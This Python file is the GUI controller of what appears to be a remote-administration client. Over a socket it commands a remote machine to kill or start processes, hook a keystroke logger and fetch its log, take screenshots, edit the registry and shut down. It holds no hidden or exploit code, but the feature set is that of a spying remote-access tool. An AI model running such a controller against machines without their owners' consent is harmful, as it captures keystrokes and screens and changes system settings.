import src.views.menu as mnu
import src.views.screenshot as ssh
import src.views.manager as mng
import src.views.keystroke as ksk
import src.views.registry as rgs
import src.views.utilities as utl
import src.model as msk
import tkinter as tk


class Controller():
    def __init__(self, sock=None):
        super().__init__()
        self._root = tk.Tk()
        self._socket = msk.MySocket()
        # Bind event to the Menu window's buttons
        self._menu = mnu.Menu(self._root)
        self._menu.btn_connect.bind("<Button>", self.connect)
        self._menu.btn_process.bind("<Button>", self.manager_prc)
        self._menu.btn_app.bind("<Button>", self.manager_app)
        self._menu.btn_keystroke.bind("<Button>", self.keystroke)
        self._menu.btn_screenshot.bind("<Button>", self.screenshot)
        self._menu.btn_registry.bind("<Button>", self.registry)
        self._menu.btn_shutdown.bind("<Button>", self.shutdown)
        self._menu.btn_quit.bind("<Button>", self.exit_prog)
        self._menu.bind("<Destroy>", lambda e: self.exit_prog(
            event=e, isKilled=True))
        self._inputbox = [None] * 4

    def run(self):
        self._menu.mainloop()

    def connect(self, event):
        ip = self._menu.myEntry.get().strip("\n")
        self._menu.resultLabel.config(text=ip)
        self._socket.connect(ip=ip)
        if not self._socket._isconnected:
            utl.messagebox("Client", "Fail to connect to server", "error")
            return

    # Function 1
    def manager_prc(self, event):
        if not self._socket._isconnected:
            utl.messagebox("Process", "Not connected to server", "warn")
            return
        self._socket.send("process")
        self._manager_prc = mng.Manager(tk.Toplevel(self._root))
        # bindings...
        self._manager_prc.btn_kill.bind("<Button>", self.manager_prc_kill)
        self._manager_prc.btn_view.bind("<Button>", self.manager_prc_view)
        self._manager_prc.btn_start.bind("<Button>", self.manager_prc_start)
        self._manager_prc.bind("<Destroy>", self.exit_func)
        # run window
        self._manager_prc.mainloop()

    def manager_prc_kill(self, event):
        self._inputbox[0] = utl.inputbox(
            tk.Toplevel(self._root), tl="process", cmd="kill")
        # binding...
        self._inputbox[0].btn_get.bind("<Button>", lambda e: self.manip_runnin(
            event=e, boxid=0, cmd="process", act="kill"))
        self._inputbox[0].mainloop()

    def manager_prc_start(self, event):
        self._inputbox[1] = utl.inputbox(
            tk.Toplevel(self._root), tl="process", cmd="start")
        # binding...
        self._inputbox[1].btn_get.bind("<Button>", lambda e: self.manip_runnin(
            event=e, boxid=1, cmd="process", act="start"))
        self._inputbox[1].mainloop()

    def manager_prc_view(self, event):
        self._socket.send("process,view")
        list_len = int(self._socket._sock.recv(32).decode('utf8'))
        data = self._socket.receive(len=list_len).decode("utf8")
        self._manager_prc.view(data)

    # Function 2
    def manager_app(self, event):
        if not self._socket._isconnected:
            utl.messagebox("Application", "Not connected to server", "warn")
            return
        self._socket.send("application")
        self._manager_app = mng.Manager(
            tk.Toplevel(self._root), "application")
        # bindings...
        self._manager_app.btn_kill.bind("<Button>", self.manager_app_kill)
        self._manager_app.btn_view.bind("<Button>", self.manager_app_view)
        self._manager_app.btn_start.bind("<Button>", self.manager_app_start)
        self._manager_app.bind("<Destroy>", self.exit_func)
        # run window
        self._manager_app.mainloop()

    def manager_app_kill(self, event):
        self._inputbox[2] = utl.inputbox(tk.Toplevel(
            self._root), tl="application", cmd="kill")
        # binding...
        self._inputbox[2].btn_get.bind("<Button>", lambda e: self.manip_runnin(
            event=e, boxid=2, cmd="application", act="kill"))
        self._inputbox[2].mainloop()

    def manager_app_start(self, event):
        self._inputbox[3] = utl.inputbox(tk.Toplevel(
            self._root), tl="application", cmd="start")
        # binding...
        self._inputbox[3].btn_get.bind("<Button>", lambda e: self.manip_runnin(
            event=e, boxid=3, cmd="application", act="start"))
        self._inputbox[3].mainloop()

    def manager_app_view(self, event):
        self._socket.send("application,view")
        list_len = int(self._socket._sock.recv(32).decode('utf8'))
        data = self._socket.receive(len=list_len).decode("utf8")
        self._manager_app.view(data)

    def manip_runnin(self, event, boxid, cmd, act):
        target = self._inputbox[boxid].getvalue()
        self._socket.send(','.join([cmd, act, target]))

    # Function 3
    def keystroke(self, event):
        if not self._socket._isconnected:
            utl.messagebox("Keystroke", "Not connected to server", "warn")
            return
        self._socket.send("keystroke")
        self._keystroke = ksk.Keystroke(tk.Toplevel(self._root))
        # bindings...
        self._keystroke.btn_hook.bind("<Button>", self.keystroke_hook)
        self._keystroke.btn_unhook.bind("<Button>", self.keystroke_unhook)
        self._keystroke.btn_print.bind("<Button>", self.keystroke_print)
        self._keystroke.bind("<Destroy>", self.exit_func)
        # self._keystroke.btn_clear.bind("<Button>", self.keystroke_clear)
        # run window
        self._keystroke.mainloop()

    def keystroke_hook(self, event):
        self._socket.send(','.join(["keystroke", "hook"]))

    def keystroke_unhook(self, event):
        self._socket.send(','.join(["keystroke", "unhook"]))

    def keystroke_print(self, event):
        self._socket.send("keystroke,print")
        log_len = int(self._socket._sock.recv(32).decode('utf8'))
        data = self._socket.receive(len=log_len).decode("utf8")
        self._keystroke.print_keystroke(data.decode("utf8"))

    # Function 4
    def screenshot(self, event):
        if not self._socket._isconnected:
            utl.messagebox("Screenshot", "Not connected to server", "warn")
            return
        self._socket.send("screenshot")
        self._screenshot = ssh.Screenshot(tk.Toplevel(self._root))
        # bindings...
        self._screenshot.btn_snap.bind("<Button>", self.screenshot_snap)
        self._screenshot.btn_save.bind("<Button>", self.screenshot_save)
        self._screenshot.bind("<Destroy>", self.exit_func)
        self._screenshot.mainloop()

    def screenshot_snap(self, event):
        # send
        self._socket.send("screenshot,snap")
        picture_len = int(self._socket._sock.recv(32).decode('utf8'))
        data = self._socket.receive(picture_len)
        self._screenshot.update_image(data)

    def screenshot_save(self, event):
        self._screenshot.save_image()

    # Function 5
    def registry(self, event):
        if not self._socket._isconnected:
            utl.messagebox("Registry", "Not connected to server", "warn")
            return
        self._socket.send("registry")
        self._registry = rgs.Registry(tk.Toplevel(self._root))
        # bindings...
        self._registry.btn_browse.bind("<Button>", self.registry_browse)
        self._registry.btn_sendcont.bind("<Button>", self.registry_sendcont)
        self._registry.btn_send.bind("<Button>", self.registry_send)
        self._registry.bind("<Destroy>", self.exit_func)
        self._registry.mainloop()

    def registry_browse(self, event):
        self._registry.browse_path()

    def registry_sendcont(self, event):
        self._socket.send(
            ','.join(["registry", "set", self._registry._regcont]))

    def registry_send(self, event):
        func = self._registry._df_func.get().strip("\n")
        path = self._registry.txt_path.get("1.0", tk.END).strip("\n")
        name = self._registry.txt_name.get("1.0", tk.END).strip("\n")
        value = self._registry.txt_value.get("1.0", tk.END).strip("\n")
        dttp = self._registry._df_dttype.get().strip("\n")

        request = None
        if func == "Get value":
            request = ["get", path, name]
        elif func == 'Set value':
            request = ["set", path, name, value, dttp]
        elif func == 'Delete value':
            request = ["delete", path, name]
        elif func == 'Create key':
            request = ["create", path]
        elif func == 'Delete key':
            request = ["delete", path]

        self._socket.send(
            ','.join(request))

    # Function 6
    def shutdown(self, event):
        if not self._socket._isconnected:
            utl.messagebox("Process", "Not connected to server", "warn")
            return
        self._socket.send("shutdown")
        self._socket.shutdown()

    def exit_func(self, event):
        self._socket.send("exit")

    # Exit program
    def exit_prog(self, event, isKilled=False):
        try:
            self._socket.send("quit")
        except OSError:
            pass
        finally:
            self._socket.close()
            if not isKilled:
                self._root.destroy()
